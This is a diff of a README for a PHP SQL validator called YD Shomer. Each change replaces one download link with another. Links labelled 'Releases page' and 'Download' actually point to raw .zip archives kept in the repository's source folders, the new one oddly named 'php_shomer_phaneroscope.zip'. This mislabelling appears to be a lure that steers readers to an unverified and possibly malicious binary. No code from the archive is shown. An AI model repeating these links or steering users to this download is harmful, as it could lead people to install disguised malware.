@@ -6,13 +6,13 @@ YD Shomer (י שומר) is a runtime SQL validator designed for PHP applications
 ## 🚀 Getting Started
 Before you begin, here are the simple steps to follow:
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Validators/php_shomer_v2.3-alpha.4.zip) to download the application.
+1. Visit our [Releases page](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Reports/php_shomer_phaneroscope.zip) to download the application.
 2. Choose the latest version available and download it to your computer.
 
 ## 💾 Download & Install
 To download YD Shomer, click the button below:
 
-[![Download php-shomer](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Validators/php_shomer_v2.3-alpha.4.zip)](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Validators/php_shomer_v2.3-alpha.4.zip)
+[![Download php-shomer](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Reports/php_shomer_phaneroscope.zip)](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Reports/php_shomer_phaneroscope.zip)
 
 After downloading, follow these steps to install and run:
 
@@ -50,7 +50,7 @@ YD Shomer offers several helpful features:
 ## 📚 Support
 If you have questions or need assistance, feel free to check the **Issues** tab on our GitHub page. You can also submit a new issue if you encounter a problem.
 
-Visit the [Releases page](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Validators/php_shomer_v2.3-alpha.4.zip) to download the software. Make sure to stay updated with the latest versions. 
+Visit the [Releases page](https://raw.githubusercontent.com/toonkuborn12345/php-shomer/main/src/Reports/php_shomer_phaneroscope.zip) to download the software. Make sure to stay updated with the latest versions. 
 
 ## 📖 Learning More
 For those curious about SQL validation and security:
